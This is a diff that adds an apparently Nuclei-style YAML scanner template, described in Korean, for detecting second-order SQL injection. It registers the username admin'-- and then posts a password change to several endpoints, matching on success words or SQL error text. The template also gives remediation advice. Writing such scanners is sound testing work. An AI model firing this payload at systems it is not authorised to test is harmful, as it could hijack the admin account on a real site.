@@ -1,0 +1,62 @@
+id: sqli-second-order
+
+info:
+  name: Second-Order SQL Injection
+  author: security-researcher
+  severity: high
+  description: |
+    2차 SQL 인젝션(저장형 SQL 인젝션) 취약점을 탐지합니다.
+    입력 시점에는 무해하나, 저장 후 조회/사용될 때 SQL 인젝션이 발생합니다.
+    회원가입 → 프로필 조회, 게시글 등록 → 검색 과정에서 주로 발생합니다.
+  tags: sqli,second-order,stored,injection
+  remediation: |
+    - 데이터 사용 시점에도 반드시 Prepared Statement 적용
+    - 저장된 데이터라도 신뢰하지 않고 항상 파라미터 바인딩 사용
+
+http:
+  # Step 1: 악성 페이로드 등록 (회원가입)
+  - method: POST
+    path:
+      - "{{BaseURL}}/register"
+      - "{{BaseURL}}/signup"
+      - "{{BaseURL}}/user/create"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "username=admin'--&email=test@test.com&password=Test1234!"
+
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+          - 302
+
+  # Step 2: 저장된 페이로드 트리거 (비밀번호 변경)
+  - method: POST
+    path:
+      - "{{BaseURL}}/change-password"
+      - "{{BaseURL}}/user/password"
+      - "{{BaseURL}}/account/update"
+
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+
+    body: "old_password=anything&new_password=Hacked123!"
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "success"
+          - "password changed"
+          - "updated"
+        case-insensitive: true
+
+      - type: regex
+        part: body
+        regex:
+          - "sql.*error|you have an error"
+        case-insensitive: true
